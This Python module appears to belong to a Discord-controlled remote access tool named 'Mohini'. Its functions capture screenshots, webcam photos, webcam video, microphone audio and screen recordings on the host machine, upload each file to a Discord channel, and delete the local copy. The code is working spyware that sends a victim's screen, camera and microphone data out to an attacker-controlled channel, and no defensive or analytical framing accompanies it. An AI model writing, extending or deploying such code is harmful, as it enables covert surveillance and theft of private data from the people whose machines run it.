import os
import time
import cv2, subprocess
import mss
import sounddevice as sd
import numpy as np
import wave
import discord
import clipboard

TEMP_DIR = "Mohini_temp"
os.makedirs(TEMP_DIR, exist_ok=True)

# Screenshot Function
async def screenshot(ctx_or_channel):
    try:
        await ctx_or_channel.send("📸 Please wait, capturing a **screenshot**...")
        filename = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
        with mss.mss() as sct:
            sct.shot(output=filename)
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Camera Capture Function
async def camera(ctx_or_channel):
    try:
        await ctx_or_channel.send("📷 Please wait, capturing an **image from the camera**...")
        filename = os.path.join(TEMP_DIR, f"camera_{int(time.time())}.png")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(filename, frame)
            await ctx_or_channel.send(file=discord.File(filename))
            os.remove(filename)
        else:
            await ctx_or_channel.send("❌ Failed to capture an image.")
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Video Recording Function
async def video(ctx_or_channel, duration: int = 5):
    try:
        await ctx_or_channel.send(f"🎥 Please wait, recording a **video** for {duration} seconds...")
        filename = os.path.join(TEMP_DIR, f"recorded_video_{int(time.time())}.mp4")
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx_or_channel.send("❌ No **camera** is present on this system.")
            return
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Audio Recording Function
async def record(ctx_or_channel, duration: int = 5):
    try:
        if len(sd.query_devices()) == 0:
            await ctx_or_channel.send("❌ No **microphone** is present on this system.")
            return
        await ctx_or_channel.send(f"🎤 Please wait, recording **audio** for {duration} seconds...")
        filename = os.path.join(TEMP_DIR, f"recorded_audio_{int(time.time())}.wav")
        samplerate = 44100
        channels = 2
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=channels, dtype=np.int16)
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(samplerate)
            wf.writeframes(audio_data.tobytes())
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")

# Screen Recording Function
async def screen_record(ctx_or_channel, duration: int = 5):
    try:
        await ctx_or_channel.send(f"🖥️ Please wait, recording **screen** for {duration} seconds...")
        filename = os.path.join(TEMP_DIR, f"screen_record_{int(time.time())}.mp4")
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        sct = mss.mss()
        monitor = sct.monitors[1]
        width, height = monitor["width"], monitor["height"]
        out = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            screenshot = sct.grab(monitor)
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            out.write(frame)
        out.release()
        await ctx_or_channel.send(file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx_or_channel.send(f"❌ Error: {e}")